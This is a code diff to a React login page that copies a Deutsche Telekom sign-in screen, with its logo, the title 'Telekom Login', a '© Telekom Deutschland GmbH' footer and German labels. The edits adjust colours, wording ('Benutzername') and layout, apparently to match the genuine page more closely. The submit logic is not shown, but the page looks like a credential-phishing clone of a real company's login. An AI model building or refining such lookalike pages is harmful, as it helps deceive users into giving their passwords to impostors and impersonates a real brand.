@@ -23,22 +23,21 @@ export default function LoginPage() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-500 via-gray-600 to-gray-700 flex flex-col">
-      {/* Telekom Logo */}
-      <div className="absolute top-0 left-0 w-24 h-24 bg-[#E20074] flex items-center justify-center">
-        <span className="text-white text-5xl font-bold">T</span>
+    <div className="min-h-screen bg-gradient-to-br from-[#7a6f6f] via-[#6b7a7f] to-[#5a8a8f] flex flex-col">
+      <div className="absolute top-0 left-0 w-20 h-20 md:w-24 md:h-24 bg-[#E20074] flex items-center justify-center">
+        <span className="text-white text-4xl md:text-5xl font-bold">T</span>
       </div>
 
       {/* Main Content */}
       <div className="flex-1 flex items-center justify-center p-4">
-        <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-8 relative">
+        <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl p-8 md:p-12 relative">
           {/* Help Icon */}
           <button className="absolute top-6 right-6 text-gray-600 hover:text-gray-800">
             <HelpCircle className="w-6 h-6" />
           </button>
 
           {/* Title */}
-          <h1 className="text-3xl font-bold mb-8 text-black">Telekom Login</h1>
+          <h1 className="text-3xl md:text-4xl font-bold mb-8 md:mb-10 text-black">Telekom Login</h1>
 
           {/* Form */}
           <form onSubmit={handleSubmit} className="space-y-6">
@@ -46,10 +45,10 @@ export default function LoginPage() {
             <div className="relative">
               <Input
                 type="email"
-                placeholder="E-Mail-Adresse"
+                placeholder="Benutzername"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
-                className="w-full h-12 px-4 pr-10 text-base border-gray-300 rounded-lg focus:border-[#E20074] focus:ring-[#E20074]"
+                className="w-full h-12 md:h-14 px-4 pr-10 text-base md:text-lg border-gray-300 rounded-lg focus:border-[#E20074] focus:ring-[#E20074]"
                 required
               />
               <button
@@ -67,7 +66,7 @@ export default function LoginPage() {
                 onCheckedChange={setRememberEmail}
                 className="data-[state=checked]:bg-[#E20074]"
               />
-              <span className="text-sm text-black">E-Mail merken</span>
+              <span className="text-sm md:text-base text-black">Benutzername merken</span>
               <button type="button" className="text-gray-500 hover:text-gray-700">
                 <HelpCircle className="w-4 h-4" />
               </button>
@@ -76,7 +75,7 @@ export default function LoginPage() {
             {/* Continue Button */}
             <Button
               type="submit"
-              className="w-full h-12 bg-[#E20074] hover:bg-[#C00060] text-white text-base font-semibold rounded-lg"
+              className="w-full h-12 md:h-14 bg-[#E20074] hover:bg-[#C00060] text-white text-base md:text-lg font-semibold rounded-lg"
             >
               Weiter
             </Button>
@@ -85,7 +84,7 @@ export default function LoginPage() {
             <Button
               type="button"
               variant="outline"
-              className="w-full h-12 bg-white border-gray-300 text-black hover:bg-gray-50 text-base font-normal rounded-lg"
+              className="w-full h-12 md:h-14 bg-white border-gray-300 text-black hover:bg-gray-50 text-base md:text-lg font-normal rounded-lg"
             >
               Andere Anmeldeoptionen
             </Button>
@@ -94,18 +93,20 @@ export default function LoginPage() {
       </div>
 
       {/* Footer */}
-      <footer className="p-6 text-white text-sm flex justify-between items-center">
-        <div>
-          <p>© Telekom Deutschland GmbH</p>
-          <p>26.26.1</p>
-        </div>
-        <div className="flex gap-6">
-          <a href="#" className="hover:underline">
-            Impressum
-          </a>
-          <a href="#" className="hover:underline">
-            Datenschutz
-          </a>
+      <footer className="p-4 md:p-6 text-white text-xs md:text-sm">
+        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
+          <div>
+            <p>© Telekom Deutschland GmbH</p>
+            <p>26.26.1</p>
+          </div>
+          <div className="flex gap-4 md:gap-6">
+            <a href="#" className="hover:underline">
+              Impressum
+            </a>
+            <a href="#" className="hover:underline">
+              Datenschutz
+            </a>
+          </div>
         </div>
       </footer>
     </div>
